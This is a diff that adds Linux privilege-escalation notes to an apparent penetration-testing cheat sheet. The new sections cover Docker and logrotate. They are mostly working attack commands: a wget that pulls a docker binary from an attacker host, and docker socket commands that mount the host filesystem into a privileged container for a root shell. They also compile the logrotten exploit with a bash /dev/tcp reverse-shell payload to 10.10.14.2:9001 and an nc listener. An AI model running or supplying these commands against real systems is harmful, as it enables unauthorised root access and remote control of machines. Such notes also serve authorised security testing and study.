@@ -1741,6 +1741,64 @@ lxc start privesc
 lxc exec privesc /bin/bash
 ```
 
+### Docker
+#### Docker Group
+```
+id
+```
+#### Docker Image
+```
+docker image ls
+```
+#### Docker Shared Directories
+You might find non-standard folders.
+#### Docker Sockets 
+```
+ls -al
+```
+#### Download docker to the machine and priv esc
+```
+wget https://<attacker-ip>:443/docker -O docker
+chmod +x docker
+ls -l
+/tmp/docker -H unix:///app/docker.sock ps
+/tmp/docker -H unix:///app/docker.sock run --rm -d --privileged -v /:/hostsystem main_app
+/tmp/docker -H unix:///app/docker.sock ps
+/tmp/docker -H unix:///app/docker.sock exec -it 7ae3bcc818af /bin/bash
+```
+#### Docker Socket
+```
+docker -H unix:///var/run/docker.sock run -v /:/mnt --rm -it ubuntu chroot /mnt bash
+```
+
+### Kubernetes???
+
+### Logratate
+#### Logrotate Version
+```
+logrotate -v
+```
+#### Logrotate Status
+```
+cat /var/lib/logrotate/status
+```
+#### Config Files
+```
+ls /etc/logrotate.d/
+```
+#### Prerequisites
+1. write permission on log files
+2. lograte runs as privileged user or root
+3. vulnerable versions: 3.8.6, 3.11.0, 3.15.0, 3.18.0
+#### Execute the explout
+```
+gcc logrotten.c -o logrotten
+echo 'bash -i >& /dev/tcp/10.10.14.2/9001 0>&1' > payload
+grep "create\|compress" /etc/logrotate.conf | grep -v "#"
+./logrotten -p ./payload /tmp/tmp.log
+nc -nblp 9001
+```
+
 
 ## Linux Internals-Based Privilege Escalation
 ## Recent 0-Days
